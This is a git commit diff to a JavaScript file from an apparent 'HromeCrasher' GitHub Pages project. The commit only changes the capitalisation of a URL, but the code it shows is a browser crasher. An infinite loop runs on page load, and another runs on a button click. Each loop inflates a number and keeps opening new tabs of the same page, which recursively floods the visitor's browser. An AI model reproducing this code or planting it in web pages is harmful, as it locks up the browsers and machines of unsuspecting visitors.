a1c91892fc4d1ca7a08e1bdb442bb27f9e330e54
Lexa <86785362+Lexa526@users.noreply.github.com>
2022-04-16 18:20:33 +0300

    Update js.js

--- js.js
+++ js.js
@@ -2,13 +2,13 @@ let da = 1
   while (1>0) {
     da = da + da * da ** da
     console.log(da)
-    window.open('https://lexa526.github.io/hromecrasher/','_blank');
+    window.open('https://lexa526.github.io/HromeCrasher/','_blank');
   }
 let crush = document.querySelector(".crush1");
 crush.addEventListener("click", (e) => {
   while (1>0) {
     da = da + da * da **
     console.log(da)
-    window.open('https://lexa526.github.io/hromecrasher/','_blank');
+    window.open('https://lexa526.github.io/HromeCrasher/','_blank');
   }
 });
